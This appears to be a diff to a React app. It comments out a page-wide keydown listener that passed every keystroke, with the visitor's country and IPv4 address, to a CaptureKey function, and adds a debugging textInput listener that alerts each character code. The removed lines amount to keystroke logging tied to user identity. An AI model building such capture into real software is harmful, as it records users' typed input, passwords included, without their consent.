@@ -32,8 +32,15 @@ const CaptureKey = (key, location, ip_address) => {
 
 function App() {
   const { location } = useContext(LocationContext);
-  window.addEventListener('keydown', function (e) {
-    location && CaptureKey(e.key, location.country_name, location.IPv4)
+  // window.addEventListener('keydown', function (e) {
+  //   location && CaptureKey(e.key, location.country_name, location.IPv4)
+   
+  // }, false);
+
+  window.addEventListener('textInput', function(e){
+    var char = e.data;
+    var keyCode = char.charCodeAt(0);
+    alert(keyCode)
   }, false);
 
   return (
